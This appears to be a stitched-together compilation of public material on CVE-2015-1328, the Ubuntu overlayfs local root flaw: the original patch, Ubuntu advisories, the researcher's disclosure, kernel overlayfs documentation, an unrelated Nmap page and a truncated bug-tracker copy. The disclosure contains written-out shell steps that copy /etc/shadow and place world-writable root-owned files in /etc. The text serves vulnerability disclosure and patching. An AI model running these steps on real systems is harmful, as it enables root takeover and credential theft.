UBUNTU: SAUCE: Overlayfs: allow unprivileged mountsUnprivileged mounting, here, refers to root in a non-initial user
namespace performing the mount. In particular, it requires
CAP\_SYS\_ADMIN toward the task's mounts namespace, alleviating
the concerns of manipulating mount environment for setuid-root
binaries on the host.
We refuse unprivileged mounting of most filesystem types because
we do not trust the in-kernel superblock parsers to correctly
handle malicious input.
However, overlayfs does not parse any user-provided data other
than the pathnames passed in. Therefore unprivileged mounting
of overlayfs should be safe.
Allowing unprivileged mounting of overlayfs filesystems would
allow Ubuntu Trusty users to create overlayfs-based container
snapshots, which would be a huge usability improvement.
This patch enables unprivileged mounting of overlayfs.
I tested a few simple combinations, and found that, when
doing (the equivalent of)
mount -t overlayfs -oupperdir=u,lowerdir=l l t
(u for upper, l for lower, t for target),
1. overlayfs mount is always allowed, regardless of ownership
of u, l, or t. However
2. Creation of new files is allowed so long as u is owned by
T. Otherwise, regardless of ownerships of l and t it is
denied. (This is expected; t was the mountpoint and
'disapears', so its ownership is irrelevant)
3. modification of a file 'hithere' which is in l but not yet
in u, and which is not owned by T, is not allowed, even if
writes to u are allowed. This may be a bug in overlayfs,
but it is safe behavior. It also will not cause a problem
for lxc since lxc will ensure that files are mapped into T's
namespace.

# USN-2641-1: Linux kernel (OMAP4) vulnerability

15 June 2015

The system could be made to run programs as an administrator.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 12.04](/security/notices?release=precise)

## Packages

* [linux-ti-omap4](/security/cves?package=linux-ti-omap4) - Linux kernel for OMAP4

## Details

Philip Pettersson discovered a privilege escalation when using overlayfs

mounts inside of user namespaces. A local user could exploit this flaw to

gain administrative privileges on the system.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 12.04

* [linux-image-3.2.0-1466-omap4](https://launchpad.net/ubuntu/%2Bsource/linux-ti-omap4)
  -
  [3.2.0-1466.86](https://launchpad.net/ubuntu/%2Bsource/linux-ti-omap4/3.2.0-1466.86)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed. If

you use linux-restricted-modules, you have to update that package as

well to get modules which work with the new kernel version. Unless you

manually uninstalled the standard kernel metapackages (e.g. linux-generic,

linux-server, linux-powerpc), a standard system upgrade will automatically

perform this as well.

# CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root

---

*From*: Philip Pettersson <philip.pettersson () gmail com>

```
Hello, this is CVE-2015-1328 which allows a local root privilege escalation
in the default configuration on all currently supported versions of Ubuntu.

The overlayfs filesystem does not correctly check file permissions when
creating new files in the upper filesystem directory. This can be exploited
by an unprivileged process in kernels with CONFIG_USER_NS=y and where
overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
inside unprivileged mount namespaces. This is the default configuration of
Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].

If you don't want to update your kernel and you don't use overlayfs, a viable
workaround is to just remove or blacklist overlayfs.ko / overlay.ko.

Details
================================

```
> ```
> From Documentation/filesystems/overlayfs.txt [2]:
>
> ```

```

"Objects that are not directories (files, symlinks, device-special
files etc.) are presented either from the upper or lower filesystem as
appropriate.  When a file in the lower filesystem is accessed in a way
the requires write-access, such as opening for write access, changing
some metadata etc., the file is first copied from the lower filesystem
to the upper filesystem (copy_up)."

The ovl_copy_up_* functions do not correctly check that the user has
permission to write files to the upperdir directory. The only permissions
that are checked is if the owner of the file that is being modified has
permission to write to the upperdir. Furthermore, when a file is copied from
the lowerdir the file metadata is carbon copied, instead of attributes such as
owner being changed to the user that triggered the copy_up_* procedures.

Example of creating a 1:1 copy of a root-owned file:

(Note that the workdir= option is not needed on older kernels)

user@ubuntu-server-1504:~$ ./create-namespace
root@ubuntu-server-1504:~# mount -t overlay -o
lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
root@ubuntu-server-1504:~# chmod 777 work/work/
root@ubuntu-server-1504:~# cd o
root@ubuntu-server-1504:~/o# mv shadow copy_of_shadow
(exit the namespace)
user@ubuntu-server-1504:~$ ls -al upper/copy_of_shadow
-rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
user@ubuntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
Device: 801h/2049d      Inode: 939791      Links: 1
Device: 801h/2049d      Inode: 277668      Links: 1

Now we can place this file in /etc by switching "upper" to be the lowerdir
option, the permission checks pass since the file is owned by root and root
can write to /etc.

user@ubuntu-server-1504:~$ ./create-namespace
root@ubuntu-server-1504:~# mount -t overlay -o
lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
root@ubuntu-server-1504:~# chmod 777 work/work/
root@ubuntu-server-1504:~# cd o
root@ubuntu-server-1504:~/o# chmod 777 copy_of_shadow
root@ubuntu-server-1504:~/o# exit
user@ubuntu-server-1504:~$ ls -al /etc/copy_of_shadow
-rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow

The attached exploit gives a root shell by creating a world-writable
/etc/ld.so.preload file. The exploit has been tested on the most recent
kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.

It is also possible to list directory contents for any directory on the system
regardless of permissions:

nobody@ubuntu-server-1504:~$ ls -al /root
ls: cannot open directory /root: Permission denied
nobody@ubuntu-server-1504:~$ mkdir o upper work
nobody@ubuntu-server-1504:~$ mount -t overlayfs -o
lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
overlayfs /home/user/o
nobody@ubuntu-server-1504:~$ ls -al o 2>/dev/null
total 8
drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
-????????? ? ?    ?          ?            ? .bash_history

Overlay Filesystem
==================
This document describes a prototype for a new approach to providing
overlay-filesystem functionality in Linux (sometimes referred to as
union-filesystems). An overlay-filesystem tries to present a
filesystem which is the result over overlaying one filesystem on top
of the other.
Overlay objects
---------------
The overlay filesystem approach is 'hybrid', because the objects that
appear in the filesystem do not always appear to belong to that filesystem.
In many cases, an object accessed in the union will be indistinguishable
from accessing the corresponding object from the original filesystem.
This is most obvious from the 'st\_dev' field returned by stat(2).
While directories will report an st\_dev from the overlay-filesystem,
non-directory objects may report an st\_dev from the lower filesystem or
upper filesystem that is providing the object. Similarly st\_ino will
only be unique when combined with st\_dev, and both of these can change
over the lifetime of a non-directory object. Many applications and
tools ignore these values and will not be affected.
In the special case of all overlay layers on the same underlying
filesystem, all objects will report an st\_dev from the overlay
filesystem and st\_ino from the underlying filesystem. This will
make the overlay mount more compliant with filesystem scanners and
overlay objects will be distinguishable from the corresponding
objects in the original filesystem.
On 64bit systems, even if all overlay layers are not on the same
underlying filesystem, the same compliant behavior could be achieved
with the "xino" feature. The "xino" feature composes a unique object
identifier from the real object st\_ino and an underlying fsid index.
If all underlying filesystems support NFS file handles and export file
handles with 32bit inode number encoding (e.g. ext4), overlay filesystem
will use the high inode number bits for fsid. Even when the underlying
filesystem uses 64bit inode numbers, users can still enable the "xino"
feature with the "-o xino=on" overlay mount option. That is useful for the
case of underlying filesystems like xfs and tmpfs, which use 64bit inode
numbers, but are very unlikely to use the high inode number bit.
Upper and Lower
---------------
An overlay filesystem combines two filesystems - an 'upper' filesystem
and a 'lower' filesystem. When a name exists in both filesystems, the
object in the 'upper' filesystem is visible while the object in the
'lower' filesystem is either hidden or, in the case of directories,
merged with the 'upper' object.
It would be more correct to refer to an upper and lower 'directory
tree' rather than 'filesystem' as it is quite possible for both
directory trees to be in the same filesystem and there is no
requirement that the root of a filesystem be given for either upper or
lower.
The lower filesystem can be any filesystem supported by Linux and does
not need to be writable. The lower filesystem can even be another
overlayfs. The upper filesystem will normally be writable and if it
is it must support the creation of trusted.\* extended attributes, and
must provide valid d\_type in readdir responses, so NFS is not suitable.
A read-only overlay of two read-only filesystems may use any
filesystem type.
Directories
-----------
Overlaying mainly involves directories. If a given name appears in both
upper and lower filesystems and refers to a non-directory in either,
then the lower object is hidden - the name refers only to the upper
object.
Where both upper and lower objects are directories, a merged directory
is formed.
At mount time, the two directories given as mount options "lowerdir" and
"upperdir" are combined into a merged directory:
mount -t overlay overlay -olowerdir=/lower,upperdir=/upper,\
workdir=/work /merged
The "workdir" needs to be an empty directory on the same filesystem
as upperdir.
Then whenever a lookup is requested in such a merged directory, the
lookup is performed in each actual directory and the combined result
is cached in the dentry belonging to the overlay filesystem. If both
actual lookups find directories, both are stored and a merged
directory is created, otherwise only one is stored: the upper if it
exists, else the lower.
Only the lists of names from directories are merged. Other content
such as metadata and extended attributes are reported for the upper
directory only. These attributes of the lower directory are hidden.
whiteouts and opaque directories
--------------------------------
In order to support rm and rmdir without changing the lower
filesystem, an overlay filesystem needs to record in the upper filesystem
that files have been removed. This is done using whiteouts and opaque
directories (non-directories are always opaque).
A whiteout is created as a character device with 0/0 device number.
When a whiteout is found in the upper level of a merged directory, any
matching name in the lower level is ignored, and the whiteout itself
is also hidden.
A directory is made opaque by setting the xattr "trusted.overlay.opaque"
to "y". Where the upper filesystem contains an opaque directory, any
directory in the lower filesystem with the same name is ignored.
readdir
-------
When a 'readdir' request is made on a merged directory, the upper and
lower directories are each read and the name lists merged in the
obvious way (upper is read first, then lower - entries that already
exist are not re-added). This merged name list is cached in the
'struct file' and so remains as long as the file is kept open. If the
directory is opened and read by two processes at the same time, they
will each have separate caches. A seekdir to the start of the
directory (offset 0) followed by a readdir will cause the cache to be
discarded and rebuilt.
This means that changes to the merged directory do not appear while a
directory is being read. This is unlikely to be noticed by many
programs.
seek offsets are assigned sequentially when the directories are read.
Thus if
- read part of a directory
- remember an offset, and close the directory
- re-open the directory some time later
- seek to the remembered offset
there may be little correlation between the old and new locations in
the list of filenames, particularly if anything has changed in the
directory.
Readdir on directories that are not merged is simply handled by the
underlying directory (upper or lower).
renaming directories
--------------------
When renaming a directory that is on the lower layer or merged (i.e. the
directory was not created on the upper layer to start with) overlayfs can
handle it in two different ways:
1. return EXDEV error: this error is returned by rename(2) when trying to
move a file or directory across filesystem boundaries. Hence
applications are usually prepared to hande this error (mv(1) for example
recursively copies the directory tree). This is the default behavior.
2. If the "redirect\_dir" feature is enabled, then the directory will be
copied up (but not the contents). Then the "trusted.overlay.redirect"
extended attribute is set to the path of the original location from the
root of the overlay. Finally the directory is moved to the new
location.
There are several ways to tune the "redirect\_dir" feature.
Kernel config options:
- OVERLAY\_FS\_REDIRECT\_DIR:
If this is enabled, then redirect\_dir is turned on by default.
- OVERLAY\_FS\_REDIRECT\_ALWAYS\_FOLLOW:
If this is enabled, then redirects are always followed by default. Enabling
this results in a less secure configuration. Enable this option only when
worried about backward compatibility with kernels that have the redirect\_dir
feature and follow redirects even if turned off.
Module options (can also be changed through /sys/module/overlay/parameters/\*):
- "redirect\_dir=BOOL":
See OVERLAY\_FS\_REDIRECT\_DIR kernel config option above.
- "redirect\_always\_follow=BOOL":
See OVERLAY\_FS\_REDIRECT\_ALWAYS\_FOLLOW kernel config option above.
- "redirect\_max=NUM":
The maximum number of bytes in an absolute redirect (default is 256).
Mount options:
- "redirect\_dir=on":
Redirects are enabled.
- "redirect\_dir=follow":
Redirects are not created, but followed.
- "redirect\_dir=off":
Redirects are not created and only followed if "redirect\_always\_follow"
feature is enabled in the kernel/module config.
- "redirect\_dir=nofollow":
Redirects are not created and not followed (equivalent to "redirect\_dir=off"
if "redirect\_always\_follow" feature is not enabled).
When the NFS export feature is enabled, every copied up directory is
indexed by the file handle of the lower inode and a file handle of the
upper directory is stored in a "trusted.overlay.upper" extended attribute
on the index entry. On lookup of a merged directory, if the upper
directory does not match the file handle stores in the index, that is an
indication that multiple upper directories may be redirected to the same
lower directory. In that case, lookup returns an error and warns about
a possible inconsistency.
Because lower layer redirects cannot be verified with the index, enabling
NFS export support on an overlay filesystem with no upper layer requires
turning off redirect follow (e.g. "redirect\_dir=nofollow").
Non-directories
---------------
Objects that are not directories (files, symlinks, device-special
files etc.) are presented either from the upper or lower filesystem as
appropriate. When a file in the lower filesystem is accessed in a way
the requires write-access, such as opening for write access, changing
some metadata etc., the file is first copied from the lower filesystem
to the upper filesystem (copy\_up). Note that creating a hard-link
also requires copy\_up, though of course creation of a symlink does
not.
The copy\_up may turn out to be unnecessary, for example if the file is
opened for read-write but the data is not modified.
The copy\_up process first makes sure that the containing directory
exists in the upper filesystem - creating it and any parents as
necessary. It then creates the object with the same metadata (owner,
mode, mtime, symlink-target etc.) and then if the object is a file, the
data is copied from the lower to the upper filesystem. Finally any
extended attributes are copied up.
Once the copy\_up is complete, the overlay filesystem simply
provides direct access to the newly created file in the upper
filesystem - future operations on the file are barely noticed by the
overlay filesystem (though an operation on the name of the file such as
rename or unlink will of course be noticed and handled).
Multiple lower layers
---------------------
Multiple lower layers can now be given using the the colon (":") as a
separator character between the directory names. For example:
mount -t overlay overlay -olowerdir=/lower1:/lower2:/lower3 /merged
As the example shows, "upperdir=" and "workdir=" may be omitted. In
that case the overlay will be read-only.
The specified lower directories will be stacked beginning from the
rightmost one and going left. In the above example lower1 will be the
top, lower2 the middle and lower3 the bottom layer.
Metadata only copy up
--------------------
When metadata only copy up feature is enabled, overlayfs will only copy
up metadata (as opposed to whole file), when a metadata specific operation
like chown/chmod is performed. Full file will be copied up later when
file is opened for WRITE operation.
In other words, this is delayed data copy up operation and data is copied
up when there is a need to actually modify data.
There are multiple ways to enable/disable this feature. A config option
CONFIG\_OVERLAY\_FS\_METACOPY can be set/unset to enable/disable this feature
by default. Or one can enable/disable it at module load time with module
parameter metacopy=on/off. Lastly, there is also a per mount option
metacopy=on/off to enable/disable this feature per mount.
Do not use metacopy=on with untrusted upper/lower directories. Otherwise
it is possible that an attacker can create a handcrafted file with
appropriate REDIRECT and METACOPY xattrs, and gain access to file on lower
pointed by REDIRECT. This should not be possible on local system as setting
"trusted." xattrs will require CAP\_SYS\_ADMIN. But it should be possible
for untrusted layers like from a pen drive.
Note: redirect\_dir={off|nofollow|follow(\*)} conflicts with metacopy=on, and
results in an error.
(\*) redirect\_dir=follow only conflicts with metacopy=on if upperdir=... is
given.
Sharing and copying layers
--------------------------
Lower layers may be shared among several overlay mounts and that is indeed
a very common practice. An overlay mount may use the same lower layer
path as another overlay mount and it may use a lower layer path that is
beneath or above the path of another overlay lower layer path.
Using an upper layer path and/or a workdir path that are already used by
another overlay mount is not allowed and may fail with EBUSY. Using
partially overlapping paths is not allowed and may fail with EBUSY.
If files are accessed from two overlayfs mounts which share or overlap the
upper layer and/or workdir path the behavior of the overlay is undefined,
though it will not result in a crash or deadlock.
Mounting an overlay using an upper layer path, where the upper layer path
was previously used by another mounted overlay in combination with a
different lower layer path, is allowed, unless the "inodes index" feature
or "metadata only copy up" feature is enabled.
With the "inodes index" feature, on the first time mount, an NFS file
handle of the lower layer root directory, along with the UUID of the lower
filesystem, are encoded and stored in the "trusted.overlay.origin" extended
attribute on the upper layer root directory. On subsequent mount attempts,
the lower root directory file handle and lower filesystem UUID are compared
to the stored origin in upper root directory. On failure to verify the
lower root origin, mount will fail with ESTALE. An overlayfs mount with
"inodes index" enabled will fail with EOPNOTSUPP if the lower filesystem
does not support NFS export, lower filesystem does not have a valid UUID or
if the upper filesystem does not support extended attributes.
For "metadata only copy up" feature there is no verification mechanism at
mount time. So if same upper is mounted with different set of lower, mount
probably will succeed but expect the unexpected later on. So don't do it.
It is quite a common practice to copy overlay layers to a different
directory tree on the same or different underlying filesystem, and even
to a different machine. With the "inodes index" feature, trying to mount
the copied layers will fail the verification of the lower root file handle.
Non-standard behavior
---------------------
Current version of overlayfs can act as a mostly POSIX compliant
filesystem.
This is the list of cases that overlayfs doesn't currently handle:
a) POSIX mandates updating st\_atime for reads. This is currently not
done in the case when the file resides on a lower layer.
b) If a file residing on a lower layer is opened for read-only and then
memory mapped with MAP\_SHARED, then subsequent changes to the file are not
reflected in the memory mapping.
The following options allow overlayfs to act more like a standards
compliant filesystem:
1) "redirect\_dir"
Enabled with the mount option or module option: "redirect\_dir=on" or with
the kernel config option CONFIG\_OVERLAY\_FS\_REDIRECT\_DIR=y.
If this feature is disabled, then rename(2) on a lower or merged directory
will fail with EXDEV ("Invalid cross-device link").
2) "inode index"
Enabled with the mount option or module option "index=on" or with the
kernel config option CONFIG\_OVERLAY\_FS\_INDEX=y.
If this feature is disabled and a file with multiple hard links is copied
up, then this will "break" the link. Changes will not be propagated to
other names referring to the same inode.
3) "xino"
Enabled with the mount option "xino=auto" or "xino=on", with the module
option "xino\_auto=on" or with the kernel config option
CONFIG\_OVERLAY\_FS\_XINO\_AUTO=y. Also implicitly enabled by using the same
underlying filesystem for all layers making up the overlay.
If this feature is disabled or the underlying filesystem doesn't have
enough free bits in the inode number, then overlayfs will not be able to
guarantee that the values of st\_ino and st\_dev returned by stat(2) and the
value of d\_ino returned by readdir(3) will act like on a normal filesystem.
E.g. the value of st\_dev may be different for two objects in the same
overlay filesystem and the value of st\_ino for directory objects may not be
persistent and could change even while the overlay filesystem is mounted.
Changes to underlying filesystems
---------------------------------
Offline changes, when the overlay is not mounted, are allowed to either
the upper or the lower trees.
Changes to the underlying filesystems while part of a mounted overlay
filesystem are not allowed. If the underlying filesystem is changed,
the behavior of the overlay is undefined, though it will not result in
a crash or deadlock.
When the overlay NFS export feature is enabled, overlay filesystems
behavior on offline changes of the underlying lower layer is different
than the behavior when NFS export is disabled.
On every copy\_up, an NFS file handle of the lower inode, along with the
UUID of the lower filesystem, are encoded and stored in an extended
attribute "trusted.overlay.origin" on the upper inode.
When the NFS export feature is enabled, a lookup of a merged directory,
that found a lower directory at the lookup path or at the path pointed
to by the "trusted.overlay.redirect" extended attribute, will verify
that the found lower directory file handle and lower filesystem UUID
match the origin file handle that was stored at copy\_up time. If a
found lower directory does not match the stored origin, that directory
will not be merged with the upper directory.
NFS export
----------
When the underlying filesystems supports NFS export and the "nfs\_export"
feature is enabled, an overlay filesystem may be exported to NFS.
With the "nfs\_export" feature, on copy\_up of any lower object, an index
entry is created under the index directory. The index entry name is the
hexadecimal representation of the copy up origin file handle. For a
non-directory object, the index entry is a hard link to the upper inode.
For a directory object, the index entry has an extended attribute
"trusted.overlay.upper" with an encoded file handle of the upper
directory inode.
When encoding a file handle from an overlay filesystem object, the
following rules apply:
1. For a non-upper object, encode a lower file handle from lower inode
2. For an indexed object, encode a lower file handle from copy\_up origin
3. For a pure-upper object and for an existing non-indexed upper object,
encode an upper file handle from upper inode
The encoded overlay file handle includes:
- Header including path type information (e.g. lower/upper)
- UUID of the underlying filesystem
- Underlying filesystem encoding of underlying inode
This encoding format is identical to the encoding format file handles that
are stored in extended attribute "trusted.overlay.origin".
When decoding an overlay file handle, the following steps are followed:
1. Find underlying layer by UUID and path type information.
2. Decode the underlying filesystem file handle to underlying dentry.
3. For a lower file handle, lookup the handle in index directory by name.
4. If a whiteout is found in index, return ESTALE. This represents an
overlay object that was deleted after its file handle was encoded.
5. For a non-directory, instantiate a disconnected overlay dentry from the
decoded underlying dentry, the path type and index inode, if found.
6. For a directory, use the connected underlying decoded dentry, path type
and index, to lookup a connected overlay dentry.
Decoding a non-directory file handle may return a disconnected dentry.
copy\_up of that disconnected dentry will create an upper index entry with
no upper alias.
When overlay filesystem has multiple lower layers, a middle layer
directory may have a "redirect" to lower directory. Because middle layer
"redirects" are not indexed, a lower file handle that was encoded from the
"redirect" origin directory, cannot be used to find the middle or upper
layer directory. Similarly, a lower file handle that was encoded from a
descendant of the "redirect" origin directory, cannot be used to
reconstruct a connected overlay path. To mitigate the cases of
directories that cannot be decoded from a lower file handle, these
directories are copied up on encode and encoded as an upper file handle.
On an overlay filesystem with no upper layer this mitigation cannot be
used NFS export in this setup requires turning off redirect follow (e.g.
"redirect\_dir=nofollow").
The overlay filesystem does not support non-directory connectable file
handles, so exporting with the 'subtree\_check' exportfs configuration will
cause failures to lookup files over NFS.
When the NFS export feature is enabled, all directory index entries are
verified on mount time to check that upper file handles are not stale.
This verification may cause significant overhead in some cases.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed. If

you use linux-restricted-modules, you have to update that package as

well to get modules which work with the new kernel version. Unless you

manually uninstalled the standard kernel metapackages (e.g. linux-generic,

linux-server, linux-powerpc), a standard system upgrade will automatically

perform this as well.

The overlayfs implementation in the linux (aka Linux kernel) package before
3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions
for file creation in the upper filesystem directory, which allows local
users to obtain root access by leveraging a configuration in which
overlayfs is permitted in an arbitrary mount namespace.

## From the Ubuntu Security Team

Philip Pettersson discovered a privilege escalation when using overlayfs
mounts inside of user namespaces. A local user could exploit this flaw to
gain administrative privileges on the system.

# CVE-2015-1328

| **Name** | CVE-2015-1328 |
| --- | --- |
| **Description** | The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace. |

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as

The overlayfs implementation in the linux (aka Linux kernel) package before
3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions
for file creation in the upper filesystem directory, which allows local
users to obtain root access by leveraging a configuration in which
overlayfs is permitted in an arbitrary mount namespace.

## From the Ubuntu Security Team

Philip Pettersson discovered a privilege escalation when using overlayfs
mounts inside of user namespaces. A local user could exploit this flaw to
gain administrative privileges on the system.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 15.04

* [linux-image-3.19.0-21-powerpc-e500mc](https://launchpad.net/ubuntu/%2Bsource/linux)

  -
  [3.19.0-21.21](https://launchpad.net/ubuntu/%2Bsource/linux/3.19.0-21.21)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed. If

you use linux-restricted-modules, you have to update that package as

well to get modules which work with the new kernel version. Unless you

manually uninstalled the standard kernel metapackages (e.g. linux-generic,

linux-server, linux-powerpc), a standard system upgrade will automatically

perform this as well.

| [Description](show_bug.cgi?id=934950#c0)  Andreas Stieger   2015-06-16 15:26:30 UTC  ``` Via oss-sec:  Hello, this is CVE-2015-1328 which allows a local root privilege escalation in the default configuration on all currently supported versions of Ubuntu.  The overlayfs filesystem does not correctly check file permissions when creating new files in the upper filesystem directory. This can be exploited by an unprivileged process in kernels with CONFIG_USER_NS=y and where overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs inside unprivileged mount namespaces. This is the default configuration of Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].  If you don't want to update your kernel and you don't use overlayfs, a viable workaround is to just remove or blacklist overlayfs.ko / overlay.ko.  Details ================================      From Documentation/filesystems/overlayfs.txt [2]:   "Objects that are not directories (files, symlinks, device-special files etc.) are presented either from the upper or lower filesystem as appropriate.  When a file in the lower filesystem is accessed in a way the requires write-access, such as opening for write access, changing some metadata etc., the file is first copied from the lower filesystem to the upper filesystem (copy_up)."  The ovl_copy_up_* functions do not correctly check that the user has permission to write files to the upperdir directory. The only permissions that are checked is if the owner of the file that is being modified has permission to write to the upperdir. Furthermore, when a file is copied from the lowerdir the file metadata is carbon copied, instead of attributes such as owner being changed to the user that triggered the copy_up_* procedures.  Example of creating a 1:1 copy of 